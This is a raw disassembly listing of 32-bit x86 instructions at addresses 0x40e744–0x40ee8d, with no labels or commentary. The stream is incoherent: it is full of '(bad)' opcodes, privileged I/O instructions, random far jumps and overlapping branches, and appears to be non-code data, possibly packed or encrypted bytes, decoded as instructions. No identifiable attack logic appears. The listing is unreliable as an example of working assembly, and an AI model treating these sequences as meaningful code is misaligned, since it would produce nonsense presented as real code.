  40e744:	fisttp WORD PTR gs:[esp+esi*2+0x4937a6e3]
  40e74c:	mov    ebp,0xd95bfd3d
  40e751:	push   ss
  40e752:	or     eax,0x6fdb774b
  40e757:	loopne 0x40e7d5
  40e759:	adc    DWORD PTR [ebp+0x59],edi
  40e75c:	scas   eax,DWORD PTR es:[edi]
  40e75d:	inc    ecx
  40e75e:	pushfw 
  40e760:	outs   dx,DWORD PTR ds:[esi]
  40e761:	add    ch,bh
  40e763:	add    BYTE PTR [ecx+0x36],bl
  40e766:	mov    ecx,0xcb60dad
  40e76b:	enter  0x825b,0x22
  40e76f:	shl    BYTE PTR [esp+ecx*2+0x72ebd764],1
  40e776:	jno    0x40e796
  40e778:	ds mov edx,0xdf3d024b
  40e77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e77f:	dec    eax
  40e780:	in     al,dx
  40e781:	fcmovu st,st(3)
  40e783:	inc    ecx
  40e784:	mov    ecx,DWORD PTR [ebx-0x3]
  40e787:	shr    ecx,cl
  40e789:	xchg   esp,eax
  40e78a:	jns    0x40e7ea
  40e78c:	lods   al,BYTE PTR ds:[esi]
  40e78d:	pop    ebp
  40e78e:	jb     0x40e758
  40e790:	stos   BYTE PTR es:[edi],al
  40e791:	jge    0x40e809
  40e793:	inc    esi
  40e794:	icebp  
  40e795:	mov    dh,0x74
  40e797:	cs jmp 0x40e797
  40e79a:	dec    esp
  40e79b:	in     al,0x98
  40e79d:	adc    DWORD PTR [esi],eax
  40e79f:	dec    edi
  40e7a0:	sbb    eax,DWORD PTR [esp]
  40e7a3:	push   edx
  40e7a4:	and    al,0x45
  40e7a6:	inc    edx
  40e7a7:	enter  0x907,0x6e
  40e7ab:	ss pop ebp
  40e7ad:	bound  esp,QWORD PTR [ebx]
  40e7af:	(bad)  
  40e7b0:	jmp    0x40e7ec
  40e7b2:	test   DWORD PTR [edi],eax
  40e7b4:	sbb    ecx,DWORD PTR [eax]
  40e7b6:	pop    edi
  40e7b7:	or     BYTE PTR [eax],al
  40e7b9:	loopne 0x40e775
  40e7bb:	(bad)  [edi]
  40e7bd:	call   0xd2c55de0
  40e7c2:	cld    
  40e7c3:	mov    eax,0xdf1b7860
  40e7c8:	(bad)  
  40e7c9:	dec    esp
  40e7ca:	jmp    0x47b4:0x953fbc97
  40e7d1:	and    dl,BYTE PTR [ebx]
  40e7d3:	cli    
  40e7d4:	jmp    0x40e7f0
  40e7d6:	inc    esp
  40e7d7:	jbe    0x40e7b3
  40e7d9:	mul    DWORD PTR [edi+0x2659ecf3]
  40e7df:	or     DWORD PTR [esi+0x37653792],esi
  40e7e5:	aaa    
  40e7e6:	dec    ebp
  40e7e7:	enter  0x8734,0xc2
  40e7eb:	mov    ch,0xc0
  40e7ed:	nop
  40e7ee:	sti    
  40e7ef:	shr    bl,1
  40e7f1:	test   BYTE PTR [ebx-0x16],bh
  40e7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7f5:	fstp   QWORD PTR [ecx+0x25df8336]
  40e7fb:	xchg   edx,eax
  40e7fc:	in     al,dx
  40e7fd:	push   esi
  40e7fe:	xchg   edi,eax
  40e7ff:	aaa    
  40e800:	pop    esi
  40e801:	and    al,0xfd
  40e803:	jmp    0x40e7c6
  40e805:	push   es
  40e806:	mov    ah,0xe
  40e808:	jecxz  0x40e7e0
  40e80a:	mov    ds:0x35eec3cf,eax
  40e80f:	pop    ecx
  40e810:	dec    ebx
  40e811:	inc    eax
  40e812:	xlat   BYTE PTR ds:[ebx]
  40e813:	stos   BYTE PTR es:[edi],al
  40e814:	mov    ecx,0x5457fd60
  40e819:	mov    bh,0xdc
  40e81b:	out    dx,al
  40e81c:	fstp   QWORD PTR [ebx+0x5612c886]
  40e822:	icebp  
  40e823:	fsubr  DWORD PTR [ebx]
  40e825:	aas    
  40e826:	call   0x5cb3dec5
  40e82b:	retf   0x69eb
  40e82e:	adc    eax,0x81c83a6f
  40e833:	nop
  40e834:	xor    eax,0x8e95fcb8
  40e839:	ins    BYTE PTR es:[edi],dx
  40e83a:	mov    eax,ds:0xfd81110e
  40e83f:	fwait
  40e840:	add    BYTE PTR [ebp-0x23],cl
  40e843:	outs   dx,BYTE PTR ds:[esi]
  40e844:	std    
  40e845:	fisubr WORD PTR [eax-0x38]
  40e848:	push   ebx
  40e849:	int3   
  40e84a:	hlt    
  40e84b:	push   es
  40e84c:	in     al,0x9c
  40e84e:	imul   ebx,DWORD PTR [esi-0x406aac13],0xfbff2da5
  40e858:	xchg   BYTE PTR [eax-0x576d7773],dl
  40e85e:	inc    edi
  40e85f:	shl    DWORD PTR [esi-0x4d],cl
  40e862:	lea    esp,[ebx]
  40e864:	stos   DWORD PTR es:[edi],eax
  40e865:	push   esi
  40e866:	jmp    0xfd4d4b9d
  40e86b:	sbb    eax,DWORD PTR [edx-0x33]
  40e86e:	inc    esi
  40e86f:	lods   eax,DWORD PTR ds:[esi]
  40e870:	stos   DWORD PTR es:[edi],eax
  40e871:	or     eax,0xee6ec85e
  40e876:	cmp    bh,BYTE PTR [esi+0x13]
  40e879:	add    dh,BYTE PTR [eax+0x6d1eeba3]
  40e87f:	mov    ?,WORD PTR [edx]
  40e881:	dec    ebp
  40e882:	inc    eax
  40e883:	sub    eax,0x5cd1dc58
  40e888:	shl    BYTE PTR [edx-0x46acd724],0xe
  40e88f:	stos   DWORD PTR es:[edi],eax
  40e890:	jmp    0x40e857
  40e892:	cdq    
  40e893:	lea    eax,[eax+0x56c0a469]
  40e899:	fild   WORD PTR [edx]
  40e89b:	and    BYTE PTR [eax*2-0x3c83f7c4],0xfc
  40e8a3:	cmp    dh,BYTE PTR [edi]
  40e8a5:	mov    ds:0xecede080,al
  40e8aa:	(bad)  
  40e8ab:	enter  0x12ba,0x98
  40e8af:	xor    al,0x1c
  40e8b1:	sar    BYTE PTR [eax],0x6d
  40e8b4:	jmp    0x40e883
  40e8b6:	mov    ds:0xdf112d4b,al
  40e8bb:	push   edx
  40e8bc:	sahf   
  40e8bd:	loop   0x40e85b
  40e8bf:	cwde   
  40e8c0:	adc    eax,0x41cb3543
  40e8c5:	fs (bad) 
  40e8c7:	jmp    0xe6607037
  40e8cc:	jmp    0x40e925
  40e8ce:	and    esp,DWORD PTR [edi+0x33]
  40e8d1:	mov    esp,0xa7965830
  40e8d6:	or     al,0xfb
  40e8d8:	out    dx,al
  40e8d9:	xor    cl,BYTE PTR [esi]
  40e8db:	fistp  QWORD PTR ds:0x745fd2df
  40e8e1:	and    al,0x64
  40e8e3:	inc    ebx
  40e8e4:	jmp    0x40e92f
  40e8e6:	pop    ecx
  40e8e7:	test   BYTE PTR [ecx-0x8],ch
  40e8ea:	cmc    
  40e8eb:	stos   BYTE PTR es:[edi],al
  40e8ec:	jmp    0xd9ac:0xa5e94edf
  40e8f3:	mov    esi,0x87fd41ca
  40e8f8:	jmp    DWORD PTR ds:0xe2dda43a
  40e8fe:	and    eax,0xd707b3d3
  40e903:	xor    eax,0xd83773eb
  40e908:	inc    edi
  40e909:	mov    cl,0xfc
  40e90b:	jl     0x40e90a
  40e90d:	call   0xf0462e84
  40e912:	mov    dl,0xc8
  40e914:	mov    WORD PTR [edx],fs
  40e916:	dec    esi
  40e917:	ret    0x61b8
  40e91a:	dec    ebp
  40e91b:	hlt    
  40e91c:	in     al,dx
  40e91d:	int    0x1e
  40e91f:	jmp    0x40e8f9
  40e921:	mov    cl,ah
  40e923:	cld    
  40e924:	sbb    ebx,DWORD PTR [edi-0x77b537e5]
  40e92a:	xor    DWORD PTR [ebx+0x35557ed2],0x41a975eb
  40e934:	push   DWORD PTR [esi]
  40e936:	xor    DWORD PTR [edi-0x369f3b9b],edx
  40e93c:	jge    0x40e999
  40e93e:	loop   0x40e92a
  40e940:	jno    0x40e970
  40e942:	push   ecx
  40e943:	adc    BYTE PTR [ecx-0x52],bl
  40e946:	cs pop ebx
  40e948:	jmp    0x40e967
  40e94a:	fwait
  40e94b:	rcl    ebp,1
  40e94d:	cmp    BYTE PTR [ebx+ecx*4+0x2d94df7e],bh
  40e954:	sub    al,BYTE PTR [eax]
  40e956:	cli    
  40e957:	jmp    0x5f90:0x1fe5f6e2
  40e95e:	arpl   si,ax
  40e960:	mov    ebx,0xcd10b948
  40e965:	fbstp  TBYTE PTR [edi-0x3e]
  40e968:	xchg   ebp,eax
  40e969:	and    al,0x22
  40e96b:	(bad)  
  40e96c:	mov    ah,0x9a
  40e96e:	cld    
  40e96f:	pusha  
  40e970:	retf   0xb37
  40e973:	in     al,0xe9
  40e975:	fnsetpm(287 only) 
  40e977:	(bad)  
  40e978:	out    0x38,eax
  40e97a:	pop    ebx
  40e97b:	cli    
  40e97c:	test   BYTE PTR [esi],dh
  40e97e:	mov    edi,0x7bfbeb7e
  40e983:	adc    dh,BYTE PTR [eax-0x4c]
  40e986:	fdivr  QWORD PTR es:[ecx+0x732794df]
  40e98d:	iret   
  40e98e:	lea    eax,ds:0x7f49fd89
  40e995:	push   ss
  40e996:	js     0x40e97a
  40e998:	jnp    0x40e977
  40e99a:	xor    eax,0x29a68ac8
  40e99f:	push   es
  40e9a0:	test   BYTE PTR [ecx-0x1b],ch
  40e9a3:	xor    ch,bl
  40e9a5:	fimul  DWORD PTR [ebx+0x68]
  40e9a8:	fs sahf 
  40e9aa:	(bad)  
  40e9ab:	sti    
  40e9ac:	cmp    bh,bl
  40e9ae:	(bad)  
  40e9af:	je     0x40e97f
  40e9b1:	jge    0x40ea2e
  40e9b3:	(bad)  
  40e9b4:	pop    ecx
  40e9b5:	dec    ebp
  40e9b6:	xor    bl,cl
  40e9b8:	jmp    0x40e9d3
  40e9ba:	mov    ecx,edi
  40e9bc:	arpl   WORD PTR [ecx+eax*1-0x221da92],sp
  40e9c3:	in     al,0x6
  40e9c5:	pop    ds
  40e9c6:	jle    0x40ea38
  40e9c8:	bound  ecx,QWORD PTR [ebx-0x24]
  40e9cb:	icebp  
  40e9cc:	jmp    0x40e9d4
  40e9ce:	call   0xb4d3:0x9b2be9ae
  40e9d5:	fmul   QWORD PTR [eax+0x3c0f1f0c]
  40e9db:	sub    esi,DWORD PTR [ebx+0x5f]
  40e9de:	fdivrp st(4),st
  40e9e0:	add    BYTE PTR [edi+0x30],ah
  40e9e3:	mov    esp,0x6656d0ab
  40e9e8:	sahf   
  40e9e9:	call   DWORD PTR [ecx-0x38]
  40e9ec:	mov    esi,0xabd46aad
  40e9f1:	es jo  0x40e99b
  40e9f4:	or     DWORD PTR [ebx-0x728b1b03],ebx
  40e9fa:	addr16 sahf 
  40e9fc:	(bad)  
  40e9fd:	mov    eax,0xdfee9dc0
  40ea02:	and    al,0xd3
  40ea04:	jbe    0x40e9a0
  40ea06:	or     al,0xa
  40ea08:	pop    ebx
  40ea09:	sar    ah,0x44
  40ea0c:	push   ds
  40ea0d:	add    edx,DWORD PTR [eax+0x3c]
  40ea10:	mov    eax,ds:0x57b6cd51
  40ea15:	pop    ds
  40ea16:	sbb    eax,ecx
  40ea18:	in     al,dx
  40ea19:	adc    eax,0x8177d9d3
  40ea1e:	add    BYTE PTR [ebx-0x7d],cl
  40ea21:	inc    edx
  40ea22:	and    BYTE PTR [edx+0x4ebc37fd],al
  40ea28:	pop    eax
  40ea29:	fistp  QWORD PTR [ebp+0x1e]
  40ea2c:	pop    ds
  40ea2d:	test   BYTE PTR [eax-0x7b],ah
  40ea30:	xchg   ecx,eax
  40ea31:	ret    0x9301
  40ea34:	add    ebp,ecx
  40ea36:	call   0x9008:0x82ebee2f
  40ea3d:	and    ch,BYTE PTR [ebx-0x1d]
  40ea40:	and    BYTE PTR [eiz*8-0x7e8413bc],al
  40ea47:	cmp    BYTE PTR [edx+0x53],0x37
  40ea4b:	xor    BYTE PTR [eax-0x27],cl
  40ea4e:	std    
  40ea4f:	or     al,0xfa
  40ea51:	and    edi,ebx
  40ea53:	sbb    DWORD PTR [esi+0x56],esi
  40ea56:	mov    esi,0xc9cb3b66
  40ea5b:	enter  0x3734,0x14
  40ea5f:	xor    al,0x30
  40ea61:	xchg   BYTE PTR [edi+0x48],bl
  40ea64:	out    0x55,al
  40ea66:	inc    ebx
  40ea67:	pop    ecx
  40ea68:	repnz mov bl,0x2c
  40ea6b:	ja     0x40ea0e
  40ea6d:	les    esi,FWORD PTR [ecx]
  40ea6f:	mov    edi,0xc8c5002e
  40ea74:	sub    DWORD PTR [esp+edi*1-0x77],edx
  40ea78:	xchg   DWORD PTR [ebx],ebp
  40ea7a:	stos   DWORD PTR es:[edi],eax
  40ea7b:	adc    eax,0xc50701dd
  40ea80:	and    eax,0x6bccdc89
  40ea85:	push   edi
  40ea86:	jge    0x40ea38
  40ea88:	sti    
  40ea89:	fcomp  DWORD PTR [esi-0xe]
  40ea8c:	test   ecx,esp
  40ea8e:	sbb    al,0xc3
  40ea90:	sbb    esp,DWORD PTR ds:0x61eb261e
  40ea96:	sub    BYTE PTR [ecx+0x327744b],cl
  40ea9c:	or     BYTE PTR [ebx+0x5f],cl
  40ea9f:	enter  0x46d8,0x69
  40eaa3:	cmp    ecx,DWORD PTR [edi]
  40eaa5:	sti    
  40eaa6:	stc    
  40eaa7:	shr    bl,cl
  40eaa9:	jecxz  0x40eaa9
  40eaab:	ins    BYTE PTR es:[edi],dx
  40eaac:	add    al,0x24
  40eaae:	xchg   edx,eax
  40eaaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eab0:	out    0x87,al
  40eab2:	imul   ecx,eax,0x3a
  40eab5:	push   es
  40eab6:	ins    DWORD PTR es:[edi],dx
  40eab7:	pop    ebx
  40eab8:	sahf   
  40eab9:	stos   DWORD PTR es:[edi],eax
  40eaba:	popf   
  40eabb:	ja     0x40eaa8
  40eabd:	out    0x92,eax
  40eabf:	and    eax,0x95626923
  40eac4:	std    
  40eac5:	fist   WORD PTR ds:0x7f1106f
  40eacb:	add    DWORD PTR [ebx-0x798bbf32],edi
  40ead1:	(bad)  
  40ead3:	inc    ebx
  40ead4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ead5:	les    ebx,FWORD PTR [ebx-0xb]
  40ead8:	gs jmp 0x40eac6
  40eadb:	sahf   
  40eadc:	retf   0x60df
  40eadf:	test   eax,0xff8bd17f
  40eae4:	jmp    0x40eb4c
  40eae6:	dec    ebp
  40eae7:	mov    dh,BYTE PTR [ebp-0xa829014]
  40eaed:	fbstp  TBYTE PTR [esi+0x64]
  40eaf0:	(bad)  
  40eaf1:	dec    eax
  40eaf2:	xor    eax,0xe596cc66
  40eaf7:	addr16 add eax,0xde0269df
  40eafd:	(bad)  
  40eafe:	cmp    DWORD PTR [esi+0x57],ebp
  40eb01:	ficom  WORD PTR [edi]
  40eb03:	sbb    al,0x97
  40eb05:	fsubr  DWORD PTR [esi+edi*4]
  40eb08:	adc    BYTE PTR [ebx+0x5],cl
  40eb0b:	xor    eax,0x8aa8efeb
  40eb10:	xchg   ecx,eax
  40eb11:	xchg   DWORD PTR [ecx+0x6cdf3f34],eax
  40eb17:	or     al,0xf9
  40eb19:	ret    
  40eb1a:	jo     0x40eb6c
  40eb1c:	ficomp WORD PTR [eax+0x29]
  40eb1f:	int3   
  40eb20:	out    0xa8,eax
  40eb22:	and    dl,BYTE PTR [esi+edx*1-0x23]
  40eb26:	jl     0x40eb0e
  40eb28:	jno    0x40eb33
  40eb2a:	(bad)
  40eb2d:	cmp    BYTE PTR [edx],0xa8
  40eb30:	div    DWORD PTR [esi]
  40eb32:	pop    eax
  40eb33:	call   0xd6e7:0xc81386e2
  40eb3a:	mov    eax,ds:0xee9493ee
  40eb3f:	fsub   st(7),st
  40eb41:	inc    ecx
  40eb42:	jge    0x40eba3
  40eb44:	iret   
  40eb45:	cmp    DWORD PTR [ebp-0x70e1adb],esi
  40eb4b:	cdq    
  40eb4c:	cli    
  40eb4d:	dec    edx
  40eb4e:	cmp    ebx,DWORD PTR [edi]
  40eb50:	sub    ebx,DWORD PTR [ecx-0x13]
  40eb53:	mov    bh,0xc1
  40eb55:	or     BYTE PTR [esi+0x26],bh
  40eb58:	jmp    0x40eae6
  40eb5a:	mov    al,ds:0xff2579f8
  40eb5f:	pop    esi
  40eb60:	pop    ss
  40eb61:	sbb    eax,0x58ee80fd
  40eb66:	and    BYTE PTR [ebx+0x5],0x96
  40eb6a:	add    eax,ecx
  40eb6c:	or     DWORD PTR [edi],esi
  40eb6e:	xchg   BYTE PTR [ecx-0x2508d976],cl
  40eb74:	mov    ds:0x3357fd07,eax
  40eb79:	mov    edx,0xa43ad15e
  40eb7e:	and    DWORD PTR [eax-0x5a],esp
  40eb81:	push   es
  40eb82:	and    DWORD PTR [edx+0x83366fd],ebx
  40eb88:	inc    edi
  40eb89:	cwde   
  40eb8a:	bound  ebp,QWORD PTR [ecx-0x2e0c24bd]
  40eb90:	mov    ecx,0x6ae8b29c
  40eb95:	or     DWORD PTR [ecx-0xd1cf1d4],eax
  40eb9b:	ret    0x1e3b
  40eb9e:	in     eax,0x7
  40eba0:	sub    ch,ch
  40eba2:	pop    ecx
  40eba3:	pop    edi
  40eba4:	jmp    0x40eb3a
  40eba6:	and    dh,dh
  40eba8:	aad    0x69
  40ebaa:	xor    DWORD PTR [eax+0x20d20bc8],edi
  40ebb0:	sahf   
  40ebb1:	fadd   QWORD PTR ds:0x1586907a
  40ebb7:	sub    BYTE PTR [ebx-0x51],ch
  40ebba:	add    DWORD PTR [ebx+ebp*8],ebp
  40ebbd:	pusha  
  40ebbe:	cmc    
  40ebbf:	dec    esi
  40ebc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebc1:	bound  esi,QWORD PTR [esi]
  40ebc3:	mov    ch,0x2e
  40ebc5:	(bad)  
  40ebc6:	dec    ebp
  40ebc7:	clc    
  40ebc8:	dec    edi
  40ebc9:	cwde   
  40ebca:	jae    0x40ebd6
  40ebcc:	stos   DWORD PTR es:[edi],eax
  40ebcd:	shl    eax,1
  40ebcf:	leave  
  40ebd0:	sbb    esp,DWORD PTR [edi-0x3]
  40ebd3:	pop    ds
  40ebd4:	test   BYTE PTR [ebx+edx*2],0xe3
  40ebd8:	xor    DWORD PTR [ebx],esp
  40ebda:	xchg   ecx,ecx
  40ebdc:	jns    0x40eb79
  40ebde:	test   BYTE PTR [edx+edx*1+0x1],0xb3
  40ebe3:	test   al,0x48
  40ebe5:	idiv   ch
  40ebe7:	dec    ebx
  40ebe8:	bt     DWORD PTR [ecx],esp
  40ebeb:	jp     0x40ec68
  40ebed:	xchg   edx,eax
  40ebee:	mov    ah,0x68
  40ebf0:	xchg   esp,eax
  40ebf1:	neg    edi
  40ebf3:	fisub  WORD PTR [edi-0x1e]
  40ebf6:	cld    
  40ebf7:	jne    0x40ec34
  40ebf9:	les    ebx,FWORD PTR [edi]
  40ebfb:	jl     0x40ec32
  40ebfd:	mov    bh,ch
  40ebff:	xchg   esi,eax
  40ec00:	and    BYTE PTR [ebp+0x49491b98],dl
  40ec06:	mov    edi,0x6d72dc8
  40ec0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec0c:	test   esp,ebx
  40ec0e:	stos   BYTE PTR es:[edi],al
  40ec0f:	jle    0x40ebfc
  40ec11:	lods   eax,DWORD PTR ds:[esi]
  40ec12:	adc    BYTE PTR [edx],bl
  40ec14:	sbb    edi,DWORD PTR [eax]
  40ec16:	(bad)  
  40ec17:	fimul  WORD PTR [edi]
  40ec19:	push   ebx
  40ec1a:	mov    al,0x94
  40ec1c:	jge    0x40ebfd
  40ec1e:	and    esp,DWORD PTR [ebx+0x3a]
  40ec21:	ja     0x40ec10
  40ec23:	lahf   
  40ec24:	nop
  40ec25:	xchg   ebp,eax
  40ec26:	std    
  40ec27:	out    dx,eax
  40ec28:	ds lahf 
  40ec2a:	mov    bh,0xf5
  40ec2c:	inc    ebx
  40ec2d:	jp     0x40ebe0
  40ec2f:	ret    0xe044
  40ec32:	nop
  40ec33:	iret   
  40ec34:	push   edi
  40ec35:	or     BYTE PTR [ecx],0xc8
  40ec38:	cld    
  40ec39:	mov    edi,DWORD PTR [esi-0x1361411]
  40ec3f:	mov    ds:0x3323e7a8,al
  40ec44:	xor    bl,bh
  40ec46:	out    0x8f,al
  40ec48:	add    al,0xa0
  40ec4a:	mov    BYTE PTR [edx-0x7902c447],cl
  40ec50:	push   DWORD PTR [eax-0xf]
  40ec53:	xor    al,0x16
  40ec55:	jp     0x40ec68
  40ec57:	enter  0x9b31,0x91
  40ec5b:	es iret 
  40ec5d:	sahf   
  40ec5e:	inc    edx
  40ec5f:	je     0x40ec4c
  40ec61:	pusha  
  40ec62:	bound  edi,QWORD PTR [edi-0x19]
  40ec65:	out    dx,al
  40ec66:	and    eax,DWORD PTR [eax-0x64]
  40ec69:	(bad)  
  40ec6a:	pusha  
  40ec6b:	xor    DWORD PTR [ebx+0x2b8e7ceb],ecx
  40ec71:	or     cx,WORD PTR [edx]
  40ec74:	jmp    0x40ecd0
  40ec76:	adc    cl,BYTE PTR [ebx]
  40ec78:	dec    esi
  40ec79:	hlt    
  40ec7a:	push   ecx
  40ec7b:	push   ebp
  40ec7c:	out    dx,al
  40ec7d:	fbstp  TBYTE PTR [edx+ebp*2-0x6ff910be]
  40ec84:	ja     0x40ec3d
  40ec86:	or     ebx,ebx
  40ec88:	loope  0x40ec4c
  40ec8a:	cld    
  40ec8b:	jb     0x40ecd5
  40ec8d:	pop    esi
  40ec8e:	xchg   esp,eax
  40ec8f:	pop    ss
  40ec90:	mov    eax,0x4d677fdf
  40ec95:	out    0x75,al
  40ec97:	fst    st(6)
  40ec99:	mov    edx,0x7f72b0fb
  40ec9e:	nop
  40ec9f:	sbb    DWORD PTR [ebx+0x60],0x49
  40eca3:	daa    
  40eca4:	rcr    bh,cl
  40eca6:	fdivrp st(6),st
  40eca8:	loop   0x40ec6b
  40ecaa:	push   esp
  40ecab:	mov    ds:0x88f90dc7,al
  40ecb0:	push   esi
  40ecb1:	pushf  
  40ecb2:	and    ebx,DWORD PTR [ebx+0x2b]
  40ecb5:	cmp    DWORD PTR [esi-0x2d],edi
  40ecb8:	jne    0x40ec7e
  40ecba:	mov    edi,0xcbaa84c8
  40ecbf:	(bad)  
  40ecc0:	(bad)  
  40ecc1:	idiv   DWORD PTR [edx+0x2f]
  40ecc4:	cdq    
  40ecc5:	inc    ecx
  40ecc6:	std    
  40ecc7:	outs   dx,DWORD PTR ds:[esi]
  40ecc8:	in     al,0xe8
  40ecca:	popf   
  40eccb:	and    DWORD PTR [edi],esp
  40eccd:	jmp    0x3986b589
  40ecd2:	xchg   BYTE PTR [ebp-0x92e6f42],cl
  40ecd8:	jmp    0x40ec6f
  40ecda:	shr    edx,cl
  40ecdc:	sub    esp,ebx
  40ecde:	mov    cl,0x95
  40ece0:	rcr    bh,1
  40ece2:	ret    0x84bb
  40ece5:	pextrw ebx,(bad),0xc5
  40ece7:	pop    edi
  40ece8:	cs pop es
  40ecea:	xchg   ebx,eax
  40eceb:	jnp    0x40ecd8
  40eced:	sahf   
  40ecee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecef:	sar    BYTE PTR [edi+0xb],0x9b
  40ecf3:	mov    bl,0xa2
  40ecf5:	fcomip st,st(5)
  40ecf7:	dec    ebx
  40ecf8:	cmp    ah,BYTE PTR [ebp+0x79]
  40ecfb:	or     BYTE PTR [eax+0x1963f45f],cl
  40ed01:	sbb    DWORD PTR [edx-0x58],edx
  40ed04:	imul   al
  40ed06:	dec    ecx
  40ed07:	test   al,0x8c
  40ed09:	or     edx,DWORD PTR [edx+ebx*8+0x6b]
  40ed0d:	jecxz  0x40ecaf
  40ed0f:	daa    
  40ed10:	pop    ebp
  40ed12:	jae    0x40ed8a
  40ed14:	loopne 0x40ed76
  40ed16:	inc    edx
  40ed17:	dec    eax
  40ed18:	xchg   ebx,eax
  40ed19:	jg     0x40ecd2
  40ed1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed1c:	mov    eax,0xdcc8017d
  40ed21:	jmp    0xa2c0beda
  40ed26:	cmp    BYTE PTR [ecx],dh
  40ed28:	in     al,0x65
  40ed2a:	push   ss
  40ed2b:	dec    eax
  40ed2c:	add    eax,ecx
  40ed2e:	ss xchg esp,eax
  40ed30:	sbb    edx,edi
  40ed32:	adc    cl,al
  40ed34:	sbb    ecx,DWORD PTR [edi]
  40ed36:	pusha  
  40ed37:	inc    esp
  40ed38:	outs   dx,DWORD PTR ds:[esi]
  40ed39:	(bad)  
  40ed3a:	or     al,0x59
  40ed3c:	jmp    0x40ecd6
  40ed3e:	jbe    0x40ecf1
  40ed40:	jbe    0x40ecc3
  40ed42:	arpl   WORD PTR [ecx],si
  40ed44:	sbb    al,0xdf
  40ed46:	xor    eax,0x2fa92806
  40ed4b:	adc    ah,ch
  40ed4d:	cmp    BYTE PTR [ecx],al
  40ed4f:	lea    edx,[esi]
  40ed51:	(bad)  
  40ed54:	mov    ecx,0x3c6b4b34
  40ed59:	fild   WORD PTR [esi+0x2816dda6]
  40ed5f:	xchg   DWORD PTR [ebx+0x2392fd54],edi
  40ed65:	mov    bh,0x49
  40ed67:	lea    esi,[edi-0x50]
  40ed6a:	and    eax,ecx
  40ed6c:	dec    ebp
  40ed6d:	sub    ebp,DWORD PTR [ecx+edx*1+0x7a9923b1]
  40ed74:	jmp    0x40ed2a
  40ed76:	int3   
  40ed77:	(bad)  
  40ed78:	rcl    DWORD PTR [ecx-0x2647ac00],1
  40ed7e:	adc    DWORD PTR [ecx+0x3899a62a],0x32
  40ed85:	sbb    eax,0x8f6bc117
  40ed8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed8b:	and    BYTE PTR [edx],al
  40ed8d:	or     al,0xfd
  40ed8f:	cmp    BYTE PTR [ebx+0x4],dl
  40ed92:	adc    esi,ebx
  40ed94:	mov    ebp,0xa29ccfb4
  40ed99:	rcr    DWORD PTR [ebx-0x38],cl
  40ed9c:	clc    
  40ed9d:	mov    eax,0x25fbceb4
  40eda2:	xor    BYTE PTR [esi+eiz*8+0x3f],cl
  40eda6:	pusha  
  40eda7:	push   ebx
  40eda8:	test   BYTE PTR [esi+0x77bf661d],0x92
  40edaf:	enter  0xb4fc,0x2e
  40edb3:	cmp    DWORD PTR [edi-0x14f8b1ff],ecx
  40edb9:	std    
  40edba:	dec    edi
  40edbb:	cmp    ebx,DWORD PTR [bp+si+0x7caa]
  40edc0:	fistp  QWORD PTR ss:[ecx]
  40edc3:	(bad)  
  40edc4:	cmp    eax,0xb762a4
  40edc9:	imul   ebp,DWORD PTR [esi],0xff48ebe6
  40edcf:	inc    edi
  40edd0:	shl    eax,0x26
  40edd3:	jne    0x40ee2c
  40edd5:	(bad)  
  40edd7:	xor    dh,BYTE PTR [eax-0x73]
  40edda:	test   DWORD PTR [ecx-0x45],ecx
  40eddd:	int3   
  40edde:	cld    
  40eddf:	mov    al,ds:0x21d75284
  40ede4:	in     eax,0x92
  40ede6:	(bad)
  40ede9:	out    dx,eax
  40edea:	mov    ebx,0x5a9b6b47
  40edef:	mov    edi,0x6122f6a4
  40edf4:	jmp    0x40ede2
  40edf6:	xor    dl,ah
  40edf8:	push   cs
  40edf9:	jp     0x40ee22
  40edfb:	or     bh,BYTE PTR [ebx+ebp*8]
  40edfe:	mov    ch,BYTE PTR [esi]
  40ee00:	das    
  40ee01:	fistp  QWORD PTR [eax-0x58]
  40ee04:	scas   al,BYTE PTR es:[edi]
  40ee05:	mov    esi,0x7a00fb10
  40ee0a:	add    BYTE PTR [eax+0x2a],al
  40ee0d:	(bad)  
  40ee0e:	or     eax,0x8e67c54d
  40ee13:	inc    edx
  40ee14:	xor    edi,ebx
  40ee16:	std    
  40ee17:	repz leave 
  40ee19:	retf   0x8947
  40ee1c:	pop    edx
  40ee1d:	sub    edi,ebp
  40ee1f:	scas   al,BYTE PTR es:[edi]
  40ee20:	dec    ebx
  40ee21:	or     eax,0xd3dcc472
  40ee26:	push   0xffffffce
  40ee28:	fwait
  40ee29:	and    al,0xce
  40ee2b:	push   ebx
  40ee2c:	or     ecx,ebp
  40ee2e:	aad    0xbd
  40ee30:	sub    ecx,DWORD PTR [eax]
  40ee32:	scas   eax,DWORD PTR es:[edi]
  40ee33:	out    dx,al
  40ee34:	cmc    
  40ee35:	adc    eax,0x5eb3984
  40ee3a:	mov    ecx,0xe858c8e7
  40ee3f:	(bad)  
  40ee40:	ror    BYTE PTR [ecx+esi*4-0x3e],1
  40ee44:	(bad)  
  40ee45:	out    dx,eax
  40ee46:	xor    DWORD PTR ds:0x46c6b6eb,ebp
  40ee4c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40ee4e:	add    dl,bh
  40ee50:	(bad)  
  40ee51:	(bad)  
  40ee53:	icebp  
  40ee54:	cmp    al,0x3d
  40ee56:	inc    esi
  40ee57:	loopne 0x40eeb8
  40ee59:	retf   
  40ee5a:	in     eax,0x5a
  40ee5c:	sbb    edi,ebx
  40ee5e:	push   es
  40ee5f:	inc    ebp
  40ee60:	arpl   WORD PTR [eax-0x201feeb5],dx
  40ee66:	mov    eax,ds:0xc3df0266
  40ee6b:	or     al,0xf6
  40ee6d:	sar    ah,0xcc
  40ee70:	adc    dl,bh
  40ee72:	fucomp st(5)
  40ee74:	arpl   WORD PTR [ecx+eax*2-0x28],bp
  40ee78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee79:	cmp    bl,bh
  40ee7b:	nop
  40ee7c:	mov    eax,ds:0x9901e606
  40ee81:	fild   WORD PTR [ebx]
  40ee83:	fnstenv ds:0xd77410d7
  40ee89:	enter  0xc95d,0x5f
  40ee8d:	lea    ebp,[edx]
